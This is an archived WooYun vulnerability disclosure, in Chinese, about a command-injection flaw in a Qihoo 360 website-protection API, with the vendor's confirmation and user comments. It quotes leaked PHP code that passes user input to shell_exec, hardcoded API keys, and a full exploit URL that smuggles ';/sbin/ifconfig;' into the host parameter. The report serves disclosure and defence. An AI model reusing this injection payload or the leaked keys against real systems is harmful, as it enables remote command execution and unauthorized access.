{"id": 66696, "wybug_id": "wooyun-2015-0141929", "wybug_title": "神器之奇虎360某命令执行导致网站卫士等多个重要业务官网可getshell（可能影响接入站长）", "wybug_corp": "奇虎360", "wybug_author": "举起手来", "wybug_date": "2015-09-18 12:55", "wybug_open_date": "2015-11-02 18:06", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["远程命令执行"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-09-18：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-09-18：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-09-28：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-10-08：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-10-18：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-11-02：\t细节向公众公开  简要描述： RT 详细说明：  上回书中说到的代码泄露中涉及api.wangzhan.360.cn那么我们来对关键代码简单审计下，为了保护企业的代码，只取部分关键代码\n//清除缓存        //$query = \"/data1/traslave_cli 127.0.0.1 purge {$domain_name}\";        //$query = \"/data1/traslave_cli 211.151.122.201 purge {$this->domain_name}\";\tif (\"*\" == $this->host || \"@\" == $this->host) {                $clear_host = $this->domain_name;        } else {                $clear_host = $this->host.\".\".$this->domain_name;        }        $query = \"/data1/traslave_cli 211.151.122.201 purge \".$clear_host;        $result = shell_exec($query);        error_log($query.\"\\n\", 3, $this->api_log_file);        error_log(\"result=\".$result.\"\\n\", 3, $this->api_log_file);        if (strcmp(\"OK\", trim($result)) == 0) {            $this->res = array(\"status\"=>array(\"code\"=>OPERATE_SUCCESS, \"message\"=>\"operation succeed\"));        } else {            $this->res = array(\"status\"=>array(\"code\"=>OPERATE_FAILED, \"message\"=>\"operation failed\"));        }\n我们看到这里有一个拼接的命令执行。那么需要怎么触发呢，首先需要找到执行这个api的方法及权限。执行方法在官方文档中有详细说明：http://wangzhan.360.cn/guide/api那关键就是如何找一个api的授权key：1、申请一个，显然不科学2、找个合作伙伴，把他们的api权限搞到手，显然很曲折3、看下官方是否有示例权限然后我就翻了一下官方给的sdk,果然找到了；\nconfig.php <?php //-----------------------不可修改-----------------------------------//网站卫士授权账号和密钥define('MID', '360test'); //授权账号define('VKEY', 'ca6f55ce981bde2a2fb145686df0d46d');//define('VKEY', 'ca6f55ce981bde2a2fb145686df0d46d'); //授权key//保护状态定义define('OPEN_PROTECT', 1); //开启保护define('CLOSE_PROTECT', 2); //关闭保护//---------------------------可修改------------------------//网站所有者信息define('OWNER_MARK', 'sunday');           //网站所有者唯一标识define('OWNER_EMAIL', 'liwenhua@360.cn'); //网站所有者邮箱//接入类型（请参看文档）define('JOIN_TYPE', 'ip');define('DATA', '1.1.1.1');\n但是...竟然是一个无效的，擦啊我再翻啊翻.。。\n➜  wangzhan_api  cat include/apiAuth.class.php <?phprequire_once(dirname(__FILE__).\"/config.inc.php\");require_once(dirname(__FILE__).\"/mysql.class.php\");class apiAuth {\tprivate $_authkey = array(\t\t'360test' => array('pkey' => 'fe4a809393132148275c72335abba5b8'), //测试专用账号                'shopex'  => array('pkey' => '5c25061f20b打码c01e6870e51'), //shopex                'west263' => array('pkey' => 'fe4a80939313打码5abba5b7'), //西数。。。省略很多\n这个开发是个好人，把key写到代码里了，尼玛。接下来就是构造请求来执行命令了host和domain_name 都可以啦。\nhttp://api.wangzhan.360.cn/wprotect.php?act=cleancachemid=360test&vkey=68130a53433b1672fb0107eb6089da50&owner_mark=sunday&owner_email=liwenhua@360.cn&domain_name=test02.com&host=www;/sbin/ifconfig;&domain_type=cname\n   漏洞证明：  漏洞影响：api.wangzhan.360.cn 对应的服务器和wangzhan.360.cn都是一个服务器集群，所以直接也可以影响网站卫士官网。\n\n然后木有深入，你们懂的。网站卫士几万站长咩。   修复方案：  上线前安全测试   版权声明：转载请注明来源 举起手来@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-09-18 18:04 厂商回复： 感谢反馈，相关业务已紧急修复此问题。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-09-18 12:55 |    \t\t故滨 \t\t\t( 普通白帽子  |\t\t\t        Rank:111 漏洞数:23        )\t\t \n  举起手来    \n     2015-09-18 12:59 |    \t\tFinger  \t\t\t( 普通白帽子  |\t\t\t        Rank:777 漏洞数:95        | 最近有人冒充该账号行骗，任何自称Finger并...)\t\t \n  so屌    \n     2015-09-18 13:01 |    \t\tscanf \t\t\t( 核心白帽子 |\t\t\t        Rank:1307 漏洞数:191        | 。)\t\t \n  好可怕    \n     2015-09-18 13:02 |    \t\trange \t\t\t( 普通白帽子  |\t\t\t        Rank:153 漏洞数:32        | 这个人有点懒，没有写个人简介)\t\t \n  好怕怕    \n     2015-09-18 13:06 |    \t\t不会游泳的鱼 \t\t\t( 普通白帽子  |\t\t\t        Rank:124 漏洞数:38        | 非著名白帽子)\t\t \n  吓死宝宝了    \n     2015-09-18 13:13 |    \t\tYuku \t\t\t( 路人 |\t\t\t        Rank:21 漏洞数:19        | 酱油哥)\t\t \n  吓死宝宝了    \n     2015-09-18 13:15 |    \t\tM4sk \t\t\t( 普通白帽子  |\t\t\t        Rank:1213 漏洞数:321        | 国内信息安全任重而道远，还需要厂商和白帽...)\t\t \n  好可怕    \n     2015-09-18 13:26 |    \t\tago \t\t\t( 普通白帽子  |\t\t\t        Rank:474 漏洞数:76        )\t\t \n  吓死宝宝了    \n     2015-09-18 13:38 |    \t\t岩少 \t\t\t( 普通白帽子  |\t\t\t        Rank:588 漏洞数:172        | 破晓团队)\t\t \n  略屌。。。。思路好屌。    \n     2015-09-18 13:43 |    \t\t举起手来 \t\t\t( 普通白帽子  |\t\t\t        Rank:581 漏洞数:61        | 准备好，举起手来！)\t\t \n  @岩少 搞的像你看过内容一样？    \n     2015-09-18 13:50 |    \t\twps2015 \t\t\t( 普通白帽子  |\t\t\t        Rank:565 漏洞数:72        | 不叫一日荒废)\t\t \n  恐怖如斯～    \n     2015-09-18 14:06 |    \t\t大师兄 \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:6        | 每日必关注乌云)\t\t \n  360官网getshell？这个标题太屌了！大片！！    \n     2015-09-18 14:32 |    \t\tlufsy \t\t\t( 路人 |\t\t\t        Rank:28 漏洞数:10        | 自由，分享，共进)\t\t \n  @举起手来 要不要这么吊啊。。。你的神器呢？    \n     2015-09-18 14:37 |    \t\tfeiyu \t\t\t( 实习白帽子  |\t\t\t        Rank:43 漏洞数:14        )\t\t \n  叼    \n     2015-09-18 14:38 |    \t\t乌云白帽子 \t\t\t( 路人 |\t\t\t        Rank:15 漏洞数:5        | 路人甲)\t\t \n  不就是个命令执行么、有什么屌的。还没有上次我直接去机房关服务器屌！    \n     2015-09-18 14:42 |    \t\t360 \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:4        | 你是我的什么？我是你的安全卫士啊！)\t\t \n  都让开！！！    \n     2015-09-18 14:51 |    \t\t大师兄 \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:6        | 每日必关注乌云)\t\t \n  @360  ÷1.44 = ？    \n     2015-09-18 15:00 |    \t\tMaster \t\t\t( 实习白帽子  |\t\t\t        Rank:33 漏洞数:10        )\t\t \n  得以噢    \n     2015-09-18 15:12 |    \t\tbackda0 \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:6        | none)\t\t \n  看看乌云都有哪些货也在补天上混··    \n     2015-09-18 15:45 |    \t\t大亮 \t\t\t( 普通白帽子  |\t\t\t        Rank:323 漏洞数:66        | 慢慢挖洞)\t\t \n  吓死本宝宝了    \n     2015-09-18 15:46 |    \t\t岩少 \t\t\t( 普通白帽子  |\t\t\t        Rank:588 漏洞数:172        | 破晓团队)\t\t \n  @举起手来 哈哈,慷慨一下。。    \n     2015-09-18 15:58 |    \t\tHerolon \t\t\t( 普通白帽子  |\t\t\t        Rank:207 漏洞数:43        | ******)\t\t \n  o    \n     2015-09-18 16:21 |    \t\t动感超人 \t\t\t( 实习白帽子  |\t\t\t        Rank:46 漏洞数:11        | 小心动感光波)\t\t \n  吓死本宝宝了    \n     2015-09-18 16:31 |    \t\t虾米 \t\t\t( 普通白帽子  |\t\t\t        Rank:105 漏洞数:13        )\t\t \n  吓死娃娃了    \n     2015-09-18 17:00 |    \t\t江南疯子 \t\t\t( 路人 |\t\t\t        Rank:13 漏洞数:4        | 多提漏洞)\t\t \n  牛BB......    \n     2015-09-18 17:03 |    \t\tB1acken \t\t\t( 普通白帽子  |\t\t\t        Rank:174 漏洞数:56        | 渣渣)\t\t \n  略吊    \n     2015-09-18 17:35 |    \t\tAuGe \t\t\t( 实习白帽子  |\t\t\t        Rank:33 漏洞数:12        | I'm coming)\t\t \n  已关注    \n     2015-09-18 17:53 |    \t\t金枪银矛小霸王 \t\t\t( 普通白帽子  |\t\t\t        Rank:125 漏洞数:27        | 不会挖洞洞的猿猿不是好学生)\t\t \n  @乌云白帽子 就你会吹牛逼    \n     2015-09-18 17:57 |    \t\t蓝天 \t\t\t( 普通白帽子  |\t\t\t        Rank:213 漏洞数:57        )\t\t \n  围观大神    \n     2015-09-18 18:07 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  30分啊    \n     2015-09-18 20:44 |    \t\t小红猪 \t\t\t( 普通白帽子  |\t\t\t        Rank:210 漏洞数:36        )\t\t \n  牛逼    \n     2015-09-20 10:42 |    \t\tSai、 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:1        | 菜菜菜菜鸟……)\t\t \n  吓死宝宝了，占个坑先    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}